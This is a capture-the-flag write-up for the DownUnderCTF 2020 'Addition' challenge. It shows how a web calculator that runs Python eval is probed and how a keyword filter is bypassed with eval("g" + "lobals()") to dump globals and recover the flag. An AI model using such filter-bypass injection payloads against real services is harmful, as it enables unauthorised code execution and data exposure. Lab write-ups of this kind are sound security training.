<!-- SPDX-License-Identifier: CC-BY-NC-ND-4.0 -->
# Addition (easy, 200pt)

_Solved on 19 Sep. 2020 (Live)._

## Statement

> Author: n00bmaster
>
> Joe is aiming to become the next supreme coder by trying to make his code smaller and smaller. His most recent project
> is a simple calculator which he reckons is super secure because of the "filters" he has in place. However, he thinks
> that he knows more than everyone around him. Put Joe in his place and grab the flag.
>
> <https://chal.duc.tf:30302/>

## Solution

Visit the challenge site.

![Screenshot of the challenge site; "My mega calculator can do any calculations python will let you do. Use * + - / % to
do complex problems if you want.", "Calculation", followed by an input box and a button labelled "Calculate for me", and
"Enter data and the results will be shown here!"](../../../../.assets/Events/2020/09_DownUnderCTF/misc/Addition-0.png)

..._any_ calculations that Python will let us do, huh? Determine whether it is a Python REPL. (For brevity, commands
prefixed with `>>>` are entered into the text box, and lines not prefixed are the output.)

```py
>>> dir()
['form', 'items', 'out', 'user_input']
```

Check each of the entries. Specifically,

```py
>>> items
globals
```

Attempt to run `globals` (I wasn't too literate with Python when I did this challenge, so... excuse my random prodding.)

```py
>>> globals
Nice try....NOT. If you want to break my code you need to try harder
```

(Optional step: research [what `globals` does](https://docs.python.org/3/library/functions.html#globals), and spend some
time in a rabbit hole about Python built-in functions.)

Note that any command that contains the string `globals` as a substring is rejected. As the server evidently doesn't
want `globals()` to be executed, there must be something in the environment -- be adamant.

```py
>>> eval("g" + "lobals()")
# The entire global symbol table is returned
```

Look through the global symbol table. Near the end,

```py
# ...
'maybe_this_maybe_not': 'DUCTF{3v4L_1s_D4ng3r0u5}',
# ...
```
